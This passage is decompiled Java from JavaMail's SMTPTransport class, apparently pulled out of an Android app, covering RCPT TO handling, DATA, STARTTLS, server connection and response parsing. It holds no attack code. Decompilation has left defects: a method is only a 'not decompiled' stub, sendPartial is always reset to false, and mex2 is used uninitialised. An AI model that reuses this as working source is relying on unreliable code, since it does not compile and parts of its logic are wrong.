        r9.println(r10);
        goto L_0x010b;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.sun.mail.smtp.SMTPTransport.mailFrom():void");
    }

    /* access modifiers changed from: protected */
    public void rcptTo() throws MessagingException {
        int i;
        int j;
        Vector valid = new Vector();
        Vector validUnsent = new Vector();
        Vector invalid = new Vector();
        MessagingException mex = null;
        boolean sendFailed = false;
        this.invalidAddr = null;
        this.validUnsentAddr = null;
        this.validSentAddr = null;
        boolean sendPartial = false;
        if (this.message instanceof SMTPMessage) {
            sendPartial = ((SMTPMessage) this.message).getSendPartial();
        }
        if (!sendPartial) {
            String sp = this.session.getProperty("mail." + this.name + ".sendpartial");
            if (sp != null) {
                if (sp.equalsIgnoreCase("true")) {
                    sendPartial = true;
                }
            }
            sendPartial = false;
        }
        if (this.debug && sendPartial) {
            this.out.println("DEBUG SMTP: sendPartial set");
        }
        boolean dsn = false;
        String notify = null;
        if (supportsExtension("DSN")) {
            if (this.message instanceof SMTPMessage) {
                notify = ((SMTPMessage) this.message).getDSNNotify();
            }
            if (notify == null) {
                notify = this.session.getProperty("mail." + this.name + ".dsn.notify");
            }
            if (notify != null) {
                dsn = true;
            }
        }
        for (InternetAddress ia : this.addresses) {
            String cmd = "RCPT TO:" + normalizeAddress(ia.getAddress());
            if (dsn) {
                cmd = new StringBuilder(String.valueOf(cmd)).append(" NOTIFY=").append(notify).toString();
            }
            sendCommand(cmd);
            int retCode = readServerResponse();
            Exception sMTPAddressSucceededException;
            Exception mex2;
            switch (retCode) {
                case 250:
                case 251:
                    valid.addElement(ia);
                    if (!this.reportSuccess) {
                        break;
                    }
                    sMTPAddressSucceededException = new SMTPAddressSucceededException(ia, cmd, retCode, this.lastServerResponse);
                    if (mex2 != null) {
                        mex2.setNextException(sMTPAddressSucceededException);
                        break;
                    } else {
                        mex2 = sMTPAddressSucceededException;
                        break;
                    }
                case 450:
                case 451:
                case 452:
                case 552:
                    if (!sendPartial) {
                        sendFailed = true;
                    }
                    validUnsent.addElement(ia);
                    sMTPAddressSucceededException = new SMTPAddressFailedException(ia, cmd, retCode, this.lastServerResponse);
                    if (mex2 != null) {
                        mex2.setNextException(sMTPAddressSucceededException);
                        break;
                    } else {
                        mex2 = sMTPAddressSucceededException;
                        break;
                    }
                case 501:
                case 503:
                case 550:
                case 551:
                case 553:
                    if (!sendPartial) {
                        sendFailed = true;
                    }
                    invalid.addElement(ia);
                    sMTPAddressSucceededException = new SMTPAddressFailedException(ia, cmd, retCode, this.lastServerResponse);
                    if (mex2 != null) {
                        mex2.setNextException(sMTPAddressSucceededException);
                        break;
                    } else {
                        mex2 = sMTPAddressSucceededException;
                        break;
                    }
                default:
                    if (retCode >= 400 && retCode <= 499) {
                        validUnsent.addElement(ia);
                    } else if (retCode < 500 || retCode > 599) {
                        if (this.debug) {
                            this.out.println("DEBUG SMTP: got response code " + retCode + ", with response: " + this.lastServerResponse);
                        }
                        String _lsr = this.lastServerResponse;
                        int _lrc = this.lastReturnCode;
                        if (this.serverSocket != null) {
                            issueCommand("RSET", 250);
                        }
                        this.lastServerResponse = _lsr;
                        this.lastReturnCode = _lrc;
                        throw new SMTPAddressFailedException(ia, cmd, retCode, _lsr);
                    } else {
                        invalid.addElement(ia);
                    }
                    if (!sendPartial) {
                        sendFailed = true;
                    }
                    sMTPAddressSucceededException = new SMTPAddressFailedException(ia, cmd, retCode, this.lastServerResponse);
                    if (mex2 != null) {
                        mex2.setNextException(sMTPAddressSucceededException);
                        break;
                    } else {
                        mex2 = sMTPAddressSucceededException;
                        break;
                    }
                    break;
            }
        }
        if (sendPartial && valid.size() == 0) {
            sendFailed = true;
        }
        if (sendFailed) {
            int i2;
            this.invalidAddr = new Address[invalid.size()];
            invalid.copyInto(this.invalidAddr);
            this.validUnsentAddr = new Address[(valid.size() + validUnsent.size())];
            i = 0;
            j = 0;
            while (j < valid.size()) {
                i2 = i + 1;
                this.validUnsentAddr[i] = (Address) valid.elementAt(j);
                j++;
                i = i2;
            }
            j = 0;
            while (j < validUnsent.size()) {
                i2 = i + 1;
                this.validUnsentAddr[i] = (Address) validUnsent.elementAt(j);
                j++;
                i = i2;
            }
        } else if (this.reportSuccess || (sendPartial && (invalid.size() > 0 || validUnsent.size() > 0))) {
            this.sendPartiallyFailed = true;
            this.exception = mex2;
            this.invalidAddr = new Address[invalid.size()];
            invalid.copyInto(this.invalidAddr);
            this.validUnsentAddr = new Address[validUnsent.size()];
            validUnsent.copyInto(this.validUnsentAddr);
            this.validSentAddr = new Address[valid.size()];
            valid.copyInto(this.validSentAddr);
        } else {
            this.validSentAddr = this.addresses;
        }
        if (this.debug) {
            if (this.validSentAddr != null && this.validSentAddr.length > 0) {
                this.out.println("DEBUG SMTP: Verified Addresses");
                for (Object obj : this.validSentAddr) {
                    this.out.println("DEBUG SMTP:   " + obj);
                }
            }
            if (this.validUnsentAddr != null && this.validUnsentAddr.length > 0) {
                this.out.println("DEBUG SMTP: Valid Unsent Addresses");
                for (Object obj2 : this.validUnsentAddr) {
                    this.out.println("DEBUG SMTP:   " + obj2);
                }
            }
            if (this.invalidAddr != null && this.invalidAddr.length > 0) {
                this.out.println("DEBUG SMTP: Invalid Addresses");
                for (Object obj22 : this.invalidAddr) {
                    this.out.println("DEBUG SMTP:   " + obj22);
                }
            }
        }
        if (sendFailed) {
            if (this.debug) {
                this.out.println("DEBUG SMTP: Sending failed because of invalid destination addresses");
            }
            notifyTransportListeners(2, this.validSentAddr, this.validUnsentAddr, this.invalidAddr, this.message);
            String lsr = this.lastServerResponse;
            int lrc = this.lastReturnCode;
            try {
                if (this.serverSocket != null) {
                    issueCommand("RSET", 250);
                }
                this.lastServerResponse = lsr;
                this.lastReturnCode = lrc;
            } catch (MessagingException e) {
                try {
                    close();
                } catch (MessagingException ex2) {
                    if (this.debug) {
                        ex2.printStackTrace(this.out);
                    }
                } catch (Throwable th) {
                    this.lastServerResponse = lsr;
                    this.lastReturnCode = lrc;
                }
                this.lastServerResponse = lsr;
                this.lastReturnCode = lrc;
            }
            throw new SendFailedException("Invalid Addresses", mex2, this.validSentAddr, this.validUnsentAddr, this.invalidAddr);
        }
    }

    /* access modifiers changed from: protected */
    public OutputStream data() throws MessagingException {
        if ($assertionsDisabled || Thread.holdsLock(this)) {
            issueSendCommand("DATA", 354);
            this.dataStream = new SMTPOutputStream(this.serverOutput);
            return this.dataStream;
        }
        throw new AssertionError();
    }

    /* access modifiers changed from: protected */
    public void finishData() throws IOException, MessagingException {
        if ($assertionsDisabled || Thread.holdsLock(this)) {
            this.dataStream.ensureAtBOL();
            issueSendCommand(".", 250);
            return;
        }
        throw new AssertionError();
    }

    /* access modifiers changed from: protected */
    public void startTLS() throws MessagingException {
        issueCommand("STARTTLS", 220);
        try {
            this.serverSocket = SocketFetcher.startTLS(this.serverSocket, this.session.getProperties(), "mail." + this.name);
            initStreams();
        } catch (IOException ioex) {
            closeConnection();
            throw new MessagingException("Could not convert socket to TLS", ioex);
        }
    }

    private void openServer(String server, int port) throws MessagingException {
        if (this.debug) {
            this.out.println("DEBUG SMTP: trying to connect to host \"" + server + "\", port " + port + ", isSSL " + this.isSSL);
        }
        try {
            this.serverSocket = SocketFetcher.getSocket(server, port, this.session.getProperties(), "mail." + this.name, this.isSSL);
            port = this.serverSocket.getPort();
            initStreams();
            int r = readServerResponse();
            if (r != 220) {
                this.serverSocket.close();
                this.serverSocket = null;
                this.serverOutput = null;
                this.serverInput = null;
                this.lineInputStream = null;
                if (this.debug) {
                    this.out.println("DEBUG SMTP: could not connect to host \"" + server + "\", port: " + port + ", response: " + r + "\n");
                }
                throw new MessagingException("Could not connect to SMTP host: " + server + ", port: " + port + ", response: " + r);
            } else if (this.debug) {
                this.out.println("DEBUG SMTP: connected to host \"" + server + "\", port: " + port + "\n");
            }
        } catch (UnknownHostException uhex) {
            throw new MessagingException("Unknown SMTP host: " + server, uhex);
        } catch (IOException ioe) {
            throw new MessagingException("Could not connect to SMTP host: " + server + ", port: " + port, ioe);
        }
    }

    private void openServer() throws MessagingException {
        int port = -1;
        String server = UNKNOWN;
        try {
            port = this.serverSocket.getPort();
            server = this.serverSocket.getInetAddress().getHostName();
            if (this.debug) {
                this.out.println("DEBUG SMTP: starting protocol to host \"" + server + "\", port " + port);
            }
            initStreams();
            int r = readServerResponse();
            if (r != 220) {
                this.serverSocket.close();
                this.serverSocket = null;
                this.serverOutput = null;
                this.serverInput = null;
                this.lineInputStream = null;
                if (this.debug) {
                    this.out.println("DEBUG SMTP: got bad greeting from host \"" + server + "\", port: " + port + ", response: " + r + "\n");
                }
                throw new MessagingException("Got bad greeting from SMTP host: " + server + ", port: " + port + ", response: " + r);
            } else if (this.debug) {
                this.out.println("DEBUG SMTP: protocol started to host \"" + server + "\", port: " + port + "\n");
            }
        } catch (IOException ioe) {
            throw new MessagingException("Could not start protocol to SMTP host: " + server + ", port: " + port, ioe);
        }
    }

    private void initStreams() throws IOException {
        Properties props = this.session.getProperties();
        PrintStream out = this.session.getDebugOut();
        boolean debug = this.session.getDebug();
        String s = props.getProperty("mail.debug.quote");
        boolean quote = s != null && s.equalsIgnoreCase("true");
        TraceInputStream traceInput = new TraceInputStream(this.serverSocket.getInputStream(), out);
        traceInput.setTrace(debug);
        traceInput.setQuote(quote);
        TraceOutputStream traceOutput = new TraceOutputStream(this.serverSocket.getOutputStream(), out);
        traceOutput.setTrace(debug);
        traceOutput.setQuote(quote);
        this.serverOutput = new BufferedOutputStream(traceOutput);
        this.serverInput = new BufferedInputStream(traceInput);
        this.lineInputStream = new LineInputStream(this.serverInput);
    }

    public synchronized void issueCommand(String cmd, int expect) throws MessagingException {
        sendCommand(cmd);
        if (readServerResponse() != expect) {
            throw new MessagingException(this.lastServerResponse);
        }
    }

    private void issueSendCommand(String cmd, int expect) throws MessagingException {
        sendCommand(cmd);
        int ret = readServerResponse();
        if (ret != expect) {
            int vul;
            int vsl = this.validSentAddr == null ? 0 : this.validSentAddr.length;
            if (this.validUnsentAddr == null) {
                vul = 0;
            } else {
                vul = this.validUnsentAddr.length;
            }
            Address[] valid = new Address[(vsl + vul)];
            if (vsl > 0) {
                System.arraycopy(this.validSentAddr, 0, valid, 0, vsl);
            }
            if (vul > 0) {
                System.arraycopy(this.validUnsentAddr, 0, valid, vsl, vul);
            }
            this.validSentAddr = null;
            this.validUnsentAddr = valid;
            if (this.debug) {
                this.out.println("DEBUG SMTP: got response code " + ret + ", with response: " + this.lastServerResponse);
            }
            String _lsr = this.lastServerResponse;
            int _lrc = this.lastReturnCode;
            if (this.serverSocket != null) {
                issueCommand("RSET", 250);
            }
            this.lastServerResponse = _lsr;
            this.lastReturnCode = _lrc;
            throw new SMTPSendFailedException(cmd, ret, this.lastServerResponse, this.exception, this.validSentAddr, this.validUnsentAddr, this.invalidAddr);
        }
    }

    public synchronized int simpleCommand(String cmd) throws MessagingException {
        sendCommand(cmd);
        return readServerResponse();
    }

    /* access modifiers changed from: protected */
    public int simpleCommand(byte[] cmd) throws MessagingException {
        if ($assertionsDisabled || Thread.holdsLock(this)) {
            sendCommand(cmd);
            return readServerResponse();
        }
        throw new AssertionError();
    }

    /* access modifiers changed from: protected */
    public void sendCommand(String cmd) throws MessagingException {
        sendCommand(ASCIIUtility.getBytes(cmd));
    }

    private void sendCommand(byte[] cmdBytes) throws MessagingException {
        if ($assertionsDisabled || Thread.holdsLock(this)) {
            try {
                this.serverOutput.write(cmdBytes);
                this.serverOutput.write(CRLF);
                this.serverOutput.flush();
                return;
            } catch (IOException ex) {
                throw new MessagingException("Can't send command to SMTP host", ex);
            }
        }
        throw new AssertionError();
    }

    /* access modifiers changed from: protected */
    public int readServerResponse() throws MessagingException {
        if ($assertionsDisabled || Thread.holdsLock(this)) {
            int returnCode;
            String serverResponse = MMMailContentUtil.MM_MESSAGE_SUBJECT;
            StringBuffer buf = new StringBuffer(100);
            String line;
            do {
                try {
                    line = this.lineInputStream.readLine();
                    if (line == null) {
                        serverResponse = buf.toString();
                        if (serverResponse.length() == 0) {
                            serverResponse = "[EOF]";
                        }
                        this.lastServerResponse = serverResponse;
                        this.lastReturnCode = -1;
                        if (!this.debug) {
                            return -1;
                        }
                        this.out.println("DEBUG SMTP: EOF: " + serverResponse);
                        return -1;
                    }
                    buf.append(line);
                    buf.append("\n");
                } catch (IOException ioex) {
                    if (this.debug) {
                        this.out.println("DEBUG SMTP: exception reading response: " + ioex);
                    }
                    this.lastServerResponse = MMMailContentUtil.MM_MESSAGE_SUBJECT;
                    this.lastReturnCode = 0;
                    throw new MessagingException("Exception reading response", ioex);
                }
            } while (isNotLastLine(line));
            serverResponse = buf.toString();
            if (serverResponse == null || serverResponse.length() < 3) {
                returnCode = -1;
            } else {
                try {
                    returnCode = Integer.parseInt(serverResponse.substring(0, 3));
                } catch (NumberFormatException e) {
                    try {
                        close();
                    } catch (MessagingException mex) {
                        if (this.debug) {
                            mex.printStackTrace(this.out);
                        }
                    }
                    returnCode = -1;
                } catch (StringIndexOutOfBoundsException e2) {
                    try {
                        close();
                    } catch (MessagingException mex2) {
                        if (this.debug) {
                            mex2.printStackTrace(this.out);
                        }
                    }
                    returnCode = -1;
                }
            }
            if (returnCode == -1 && this.debug) {
                this.out.println("DEBUG SMTP: bad server response: " + serverResponse);
            }
            this.lastServerResponse = serverResponse;
            this.lastReturnCode = returnCode;
            return returnCode;
        }
        throw new AssertionError();
    }

    /* access modifiers changed from: protected */
    public void checkConnected() {
        if (!super.isConnected()) {
            throw new IllegalStateException("Not connected");
        }
    }

    private boolean isNotLastLine(String line) {
        return line != null && line.length() >= 4 && line.charAt(3) == '-';
    }

    private String normalizeAddress(String addr) {
        if (addr.startsWith("<") || addr.endsWith(">")) {
            return addr;
        }
        return "<" + addr + ">";
    }

    public boolean supportsExtension(String ext) {
        return (this.extMap == null || this.extMap.get(ext.toUpperCase(Locale.ENGLISH)) == null) ? false : true;
    }

    public String getExtensionParameter(String ext) {
        if (this.extMap == null) {
            return null;
        }
        return (String) this.extMap.get(ext.toUpperCase(Locale.ENGLISH));
    }

    /* access modifiers changed from: protected */
    public boolean supportsAuthentication(String auth) {
        if (!$assertionsDisabled && !Thread.holdsLock(this)) {
            throw new AssertionError();
        } else if (this.extMap == null) {
            return false;
        } else {
            String a = (String) this.extMap.get("AUTH");
            if (a == null) {
                return false;
            }
            StringTokenizer st = new StringTokenizer(a);
            while (st.hasMoreTokens()) {
                if (st.nextToken().equalsIgnoreCase(auth)) {
                    return true;
                }
            }
            return false;
        }
    }

    protected static String xtext(String s) {
        StringBuffer sb = null;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c >= 128) {
                throw new IllegalArgumentException("Non-ASCII character in SMTP submitter: " + s);
            }
            if (c < '!' || c > '~' || c == '+' || c == '=') {
                if (sb == null) {
                    sb = new StringBuffer(s.length() + 4);
                    sb.append(s.substring(0, i));
                }
                sb.append('+');
                sb.append(hexchar[(c & 240) >> 4]);
                sb.append(hexchar[c & 15]);
            } else if (sb != null) {
                sb.append(c);
            }
        }
        return sb != null ? sb.toString() : s;
    }
}
